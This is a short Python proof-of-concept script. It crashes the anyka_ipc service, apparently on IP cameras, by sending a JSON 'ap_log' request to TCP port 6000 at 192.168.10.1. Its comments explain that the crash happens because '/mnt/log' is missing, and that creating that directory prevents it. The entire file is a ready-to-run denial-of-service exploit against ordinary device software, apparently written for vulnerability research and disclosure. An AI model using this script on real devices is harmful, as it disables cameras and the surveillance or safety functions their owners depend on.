#####################################################
# Performs a request with 'ap_log' operator to get  #
# size of non-existent log file, crashes everything #
# as the '/mnt/log' directory is not present by     #
# default - on port 6000 hosted by anyka_ipc        #
# (libcloudapi.so)                                  #
#####################################################

import json
import socket
import time

# ap_log crashes everything as the '/mnt/log' directory is not present by default
# creating this directory stops it from crashing when this script is sent

# Define the JSON data
data = {
    "operator": "ap_log",
}

# Convert the data to JSON format
json_data = json.dumps(data)

# Define the target IP address and port
target_ip = "192.168.10.1"
target_port = 6000

# Create a TCP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    # Connect to the target IP and port
    sock.connect((target_ip, target_port))

    # Send the JSON data
    sock.sendall(json_data.encode())

    print(f"JSON data sent to {target_ip}:{target_port}:\n{json_data}")

    # Optionally, you can wait for a response here if the server is expected to send one.
    response = sock.recv(1024)
    print(f"Received response: {response.decode()}")

except Exception as e:
    print(f"Error: {str(e)}")

finally:
    # Close the socket
    sock.close()